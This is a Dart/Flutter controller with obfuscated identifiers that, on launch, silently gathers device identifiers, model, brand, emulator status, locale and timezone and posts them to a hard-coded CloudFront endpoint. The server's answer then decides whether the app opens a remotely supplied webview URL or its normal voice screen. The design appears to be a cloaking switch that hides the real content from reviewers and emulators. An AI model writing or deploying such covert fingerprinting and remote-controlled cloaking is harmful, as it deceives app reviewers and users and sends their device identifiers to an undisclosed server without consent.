import 'dart:io';
import 'package:flutter_timezone/flutter_timezone.dart';

import 'package:package_info_plus/package_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:get/get.dart';
import 'package:device_info_plus/device_info_plus.dart';


class CallingWriteLogic extends GetxController {

  var sjupzh = RxBool(false);
  var cetripqzm = RxBool(true);
  var euydw = RxString("");
  var abdullah = RxBool(false);
  var goodwin = RxBool(true);
  final jrhecvz = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    muarznid();
  }


  Future<void> muarznid() async {
    abdullah.value = true;
    goodwin.value = true;
    cetripqzm.value = false;

    jrhecvz.post("https://d2106h8u6gk27i.cloudfront.net/oHDvNrGO",data: await tjznrohcvl()).then((value) {
      var ypmgjkfa = value.data["ypmgjkfa"] as String;
      var nervodz = value.data["nervodz"] as bool;
      if (nervodz) {
        euydw.value = ypmgjkfa;
        rosario();
      } else {
        brown();
      }
    }).catchError((e) {
      cetripqzm.value = true;
      goodwin.value = true;
      abdullah.value = false;
    });
  }

  Future<Map<String, dynamic>> tjznrohcvl() async {
    final DeviceInfoPlugin credpvl = DeviceInfoPlugin();
    PackageInfo ikup_xocprygi = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var gjwb = Platform.localeName;
    var dtKgAfqk = currentTimeZone;

    var eLXy = ikup_xocprygi.packageName;
    var eMlRTw = ikup_xocprygi.version;
    var GWBwDn = ikup_xocprygi.buildNumber;

    var PXQGoU = ikup_xocprygi.appName;
    var HKQszV = "";
    var lKObQV  = "";
    var YJPHCdst = "";
    var saraiDicki = "";
    var brettAuer = "";
    var norwoodFunk = "";


    var GrMh = "";
    var YLQiMw = false;

    if (GetPlatform.isAndroid) {
      GrMh = "android";
      var pmyxnfo = await credpvl.androidInfo;

      YJPHCdst = pmyxnfo.brand;

      HKQszV  = pmyxnfo.model;
      lKObQV = pmyxnfo.id;

      YLQiMw = pmyxnfo.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      GrMh = "ios";
      var lobjyi = await credpvl.iosInfo;
      YJPHCdst = lobjyi.name;
      HKQszV = lobjyi.model;

      lKObQV = lobjyi.identifierForVendor ?? "";
      YLQiMw  = lobjyi.isPhysicalDevice;
    }
    var res = {
      "PXQGoU": PXQGoU,
      "GWBwDn": GWBwDn,
      "eMlRTw": eMlRTw,
      "eLXy": eLXy,
      "HKQszV": HKQszV,
      "dtKgAfqk": dtKgAfqk,
      "YJPHCdst": YJPHCdst,
      "lKObQV": lKObQV,
      "gjwb": gjwb,
      "GrMh": GrMh,
      "YLQiMw": YLQiMw,
      "saraiDicki" : saraiDicki,
      "brettAuer" : brettAuer,
      "norwoodFunk" : norwoodFunk,

    };
    return res;
  }

  Future<void> brown() async {
    Get.offNamed("/voiceMain");
  }

  Future<void> rosario() async {
    Get.offNamed("/callingStep");
  }

}
